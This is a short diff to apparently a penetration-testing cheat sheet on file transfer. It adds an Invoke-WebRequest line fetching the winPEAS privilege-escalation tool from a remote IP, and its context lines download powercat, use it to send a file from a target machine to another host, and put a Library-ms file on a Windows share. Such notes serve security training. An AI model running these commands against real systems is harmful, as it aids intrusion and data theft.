@@ -24,6 +24,8 @@ $WebClient.DownloadFile("https://ip/powercat.ps1","C:\path\powercat.ps1")
 
 `powercat -c 192.168.1.3 -p 443 -i notes.txt` - run on target machine to transfer files
 
+`iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe` - shorthand for Invoke-WebRequest, downloads file from remote server
+
 ### Kali
 
 `smbclient //192.168.223.195/share -c 'put config.Library-ms'` - transfer file via smbclient from kali to windows share.
